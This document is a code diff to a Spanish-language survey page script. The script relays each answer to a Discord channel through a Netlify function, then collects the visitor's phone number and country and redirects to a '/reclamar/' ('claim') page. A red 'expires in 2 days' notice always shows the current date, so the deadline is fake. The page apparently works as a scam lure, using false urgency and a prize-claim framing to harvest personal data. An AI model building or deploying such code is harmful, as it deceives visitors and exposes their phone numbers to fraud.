@@ -217,7 +217,7 @@ const questions = [
         name: "q23"
     }
 ];
-
+/*
 let currentQuestionIndex = 0;
 const userAnswers = {};
 
@@ -312,6 +312,156 @@ document.addEventListener('DOMContentLoaded', () => {
     const mes = String(hoy.getMonth() + 1).padStart(2, '0');
     const año = hoy.getFullYear();
     const fechaNumerica = `${dia}/${mes}/${año}`;
+    const fechaElemento = document.getElementById('fecha');
+    if (fechaElemento) {
+        fechaElemento.innerHTML = `${fechaNumerica} <span style="color: red;">vence en 2 días.</span>`;
+    }
+});*/
+
+let currentQuestionIndex = 0;
+const userAnswers = {};
+
+let savedFinished = false;
+const saved = JSON.parse(localStorage.getItem('surveyProgress') || '{}');
+if (saved.finished) {
+    savedFinished = true;
+} else if (saved.currentQuestionIndex !== undefined) {
+    currentQuestionIndex = saved.currentQuestionIndex;
+    Object.assign(userAnswers, saved.userAnswers || {});
+}
+
+let questionBox;
+
+async function sendToDiscord(content) {
+    try {
+        await fetch('/.netlify/functions/send-message', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content })
+        });
+    } catch (e) {
+        console.error('Error sending to Discord:', e);
+    }
+}
+
+async function sendAnswerToDiscord(questionName, answer) {
+    // Prevenir envío cuando la encuesta está completada
+    if (savedFinished || currentQuestionIndex >= questions.length) return;
+    
+    try {
+        const q = questions.find(q => q.name === questionName);
+        if (!q) return; // Asegurarse que la pregunta existe
+        
+        const content = `**${currentQuestionIndex + 1} - ${q.question}**\n${answer}`;
+        await sendToDiscord(content);
+    } catch (e) {
+        console.error(e);
+    }
+}
+
+function renderQuestion() {
+    const q = questions[currentQuestionIndex];
+    let html = '';
+    if (q.isDynamic) {
+        const opts = q.dynamicOptions.map(n => userAnswers[n]).filter(Boolean);
+        if (!opts.length) {
+            questionBox.innerHTML = '<p>Error: faltan respuestas anteriores.</p>';
+            return;
+        }
+        html = opts.map((o, i) => `<label><input type="radio" name="${q.name}" value="${i}">${o}</label>`).join('');
+    } else {
+        html = q.options.map(o => `<label><input type="radio" name="${q.name}" value="${o.value}">${o.text}</label>`).join('');
+    }
+    questionBox.innerHTML = `<p>${q.question}</p>${html}`;
+}
+
+function showFinishedScreen() {
+    questionBox.style.display = 'none';
+    const divNone = document.getElementById('div-none');
+    if (divNone) divNone.style.display = 'flex';
+    
+    const nextBtn = document.querySelector('button[onclick="nextQuestion()"]');
+    if (nextBtn) {
+        nextBtn.textContent = 'Último paso';
+        nextBtn.onclick = handleLastStep;
+        nextBtn.disabled = true;
+    }
+    
+    const celularInput = document.getElementById('celular');
+    const paisInput = document.getElementById('pais');
+    
+    if (celularInput && paisInput) {
+        const validateInputs = () => {
+            nextBtn.disabled = !(celularInput.value.trim() && paisInput.value.trim());
+        };
+        
+        celularInput.addEventListener('input', validateInputs);
+        paisInput.addEventListener('input', validateInputs);
+    }
+}
+
+async function handleLastStep() {
+    const celular = document.getElementById('celular')?.value.trim();
+    const pais = document.getElementById('pais')?.value.trim();
+    
+    if (!celular) return alert('Por favor, completa el campo de celular');
+    if (!pais) return alert('Por favor, completa el campo de país');
+    
+    try {
+        await sendToDiscord(`📱 Celular: ${celular}\n🌎 País: ${pais}`);
+        window.location.href = '/reclamar/';
+    } catch (e) {
+        console.error('Error in last step:', e);
+        alert('Ocurrió un error. Por favor, inténtalo de nuevo.');
+    }
+}
+
+function nextQuestion() {
+    const q = questions[currentQuestionIndex];
+    const selected = document.querySelector(`input[name="${q.name}"]:checked`);
+    if (!selected) return alert('Por favor, selecciona una opción');
+
+    let answer;
+    if (q.isDynamic) {
+        const opts = q.dynamicOptions.map(n => userAnswers[n]).filter(Boolean);
+        answer = opts[selected.value];
+    } else {
+        const option = q.options.find(o => o.value === selected.value);
+        answer = option ? option.text : 'Opción no válida';
+    }
+
+    userAnswers[q.name] = answer;
+    localStorage.setItem('surveyProgress', JSON.stringify({ 
+        currentQuestionIndex, 
+        userAnswers 
+    }));
+    
+    // Solo enviar respuestas válidas
+    if (currentQuestionIndex < questions.length) {
+        sendAnswerToDiscord(q.name, answer);
+    }
+
+    if (++currentQuestionIndex < questions.length) {
+        renderQuestion();
+    } else {
+        localStorage.setItem('surveyProgress', JSON.stringify({ 
+            finished: true,
+            userAnswers
+        }));
+        showFinishedScreen();
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    questionBox = document.querySelector('.question-box');
+    if (savedFinished) {
+        showFinishedScreen();
+    } else {
+        renderQuestion();
+    }
+
+    const hoy = new Date();
+    const fechaNumerica = `${String(hoy.getDate()).padStart(2, '0')}/${String(hoy.getMonth() + 1).padStart(2, '0')}/${hoy.getFullYear()}`;
     const fechaElemento = document.getElementById('fecha');
     if (fechaElemento) {
         fechaElemento.innerHTML = `${fechaNumerica} <span style="color: red;">vence en 2 días.</span>`;
